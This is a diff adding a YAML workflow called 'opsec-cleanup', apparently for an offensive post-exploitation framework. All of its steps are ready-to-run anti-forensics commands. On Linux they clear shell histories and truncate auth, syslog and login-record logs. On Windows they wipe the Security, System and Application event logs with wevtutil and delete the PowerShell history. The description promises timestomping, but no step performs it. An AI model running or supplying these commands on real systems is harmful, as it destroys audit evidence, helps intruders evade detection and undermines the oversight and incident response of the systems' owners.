@@ -1,0 +1,64 @@
+name: opsec-cleanup
+description: OPSEC cleanup — clear shell history, wipe logs, timestomp files, and
+  remove forensic artifacts.
+tags:
+- post
+- opsec
+- cleanup
+- anti-forensics
+- log-wipe
+dispatch:
+  inputs:
+    os_type:
+      type: string
+      default: linux
+      description: 'Target OS: linux, windows'
+    aggressive:
+      type: boolean
+      default: false
+      description: Aggressive mode — wipes wtmp/btmp/lastlog (more detectable)
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+jobs:
+  linux-cleanup:
+    name: Linux Cleanup
+    run_if: '{{ inputs.os_type == ''linux'' }}'
+    steps:
+    - name: history
+      run: unset HISTFILE && export HISTSIZE=0 && history -c && rm -f ~/.bash_history
+        ~/.zsh_history ~/.mysql_history ~/.psql_history ~/.python_history 2>/dev/null;
+        echo "History cleared"
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+    - name: logs
+      run: for log in /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages
+        /var/log/kern.log; do truncate -s 0 "$log" 2>/dev/null && echo "Wiped $log";
+        done{% if inputs.aggressive %}; for log in /var/log/wtmp /var/log/btmp /var/log/lastlog
+        /var/run/utmp; do truncate -s 0 "$log" 2>/dev/null && echo "Wiped $log"; done{%
+        endif %}
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+    - name: ssh-known-hosts
+      run: rm -f ~/.ssh/known_hosts 2>/dev/null && echo "Removed SSH known_hosts"
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+  windows-cleanup:
+    name: Windows Cleanup
+    run_if: '{{ inputs.os_type == ''windows'' }}'
+    steps:
+    - name: event-logs
+      run: wevtutil cl Security 2>nul && wevtutil cl System 2>nul && wevtutil cl Application
+        2>nul && echo "Event logs cleared"
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+    - name: temp
+      run: del /f /s /q %TEMP%\* 2>nul && echo "Temp files cleared"
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
+    - name: powershell-history
+      run: del /f /q %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+        2>nul && echo "PS history cleared"
+      continue-on-error: true
+      log-command: '{{ inputs.log_command }}'
